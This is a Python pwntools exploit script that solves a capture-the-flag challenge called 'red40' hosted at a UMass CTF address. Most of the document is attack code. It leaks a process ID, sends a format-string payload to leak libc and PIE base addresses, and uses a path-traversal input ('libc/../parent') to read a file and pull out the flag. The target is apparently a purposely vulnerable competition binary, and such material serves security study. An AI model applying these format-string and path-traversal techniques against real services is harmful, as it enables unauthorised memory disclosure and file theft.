#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=0.0.0.0' '--port=1000' red40
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'source/red40')

# Load the C standard library
libc = ELF("source/libc/libc.so.6")  # Assuming you are using a Unix-like system, adjust accordingly for Windows

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'red40.ctf.umasscybersec.org'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *warn_get+120
b *warn_get+157
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./libc'

def check_rand():
    while True:
        rand = libc.rand() % (41) == 40
        return rand


def gamble():
    while True:    
        io.sendline(b"Y")
        if b"YOU LOST" in io.recvuntil(b"> "):
            return gamble()
            

        io.sendline(b"1")
        io.recvuntil(b"You are now appreciating your ")
        recv = int(io.recvline().split(b"RED40")[0].strip())
        return recv

def get_parentpid():
    io.sendlineafter(b"> ", b"2")
    io.recvuntil(b"> ")
    p_pid = gamble()   
    log.success(f"PPID @ {p_pid}")
    return p_pid

def steal(file):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'>', file)
    io.recvline()
    leak = io.recvuntil(b"You have stolen a lot of red40...")
    return leak

def warn():
    libc_offset = 21
    exe_offset = 23
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b">\n", f"%{libc_offset}$p%{exe_offset}$p".encode())
    recv = io.recvline()
    log.info(recv)

    libc_address = int(recv[:14],16) - 0x29d90
    log.success(f"libc_base => {hex(libc_address)}")
    exe_address = int(recv[14:],16) - exe.sym["main"]
    log.success(f"pie_base => {hex(exe_address)}")
    return libc_address, exe_address



def leak_from_maps(maps, file):
    for line in maps.splitlines():
        if file in line:
            file_base = int(line.split(b"-")[0], 16)
            log.success(f"{file} base @ {hex(file_base)}")

            return file_base


io = start(["loop"])

p_pid = get_parentpid()
maps = steal(f"libc/../parent".encode())
print(maps)
log.success(re.search(b'UMASS{.+}', maps).group())
io.interactive()

